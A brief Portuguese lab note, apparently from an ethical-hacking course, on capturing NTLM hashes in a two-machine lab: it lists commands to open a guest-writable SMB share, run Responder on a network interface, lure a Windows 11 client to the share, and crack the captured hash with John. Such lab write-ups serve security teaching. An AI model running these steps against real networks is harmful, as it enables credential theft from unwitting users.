
### Imagens e Configurações de Instâncias

- **win11 c5large 65gb**
- **Parrot OS c5 65gb**

comando para partilhar pasta
sudo net usershare add sharefolder /home/parrot/sharefolder "A secret folder shared via SMB" everyone:F guest_ok=y
executar
responder -I ens5

no win11 run: \\ip privado do parrot
tentar meter a pass vai dar erro e aparace o hash no parrot
![image](https://github.com/pinhers/Ethical-Hacking/assets/145346889/3dfce7ff-cc32-45aa-870b-d50793e12673)


parrot-logs:
/usr/share/responder/logs
john SMB-xxxxxxxx- TAB

troubleshot:
sudo lsof -i :445
sudo systemctl stop smbd
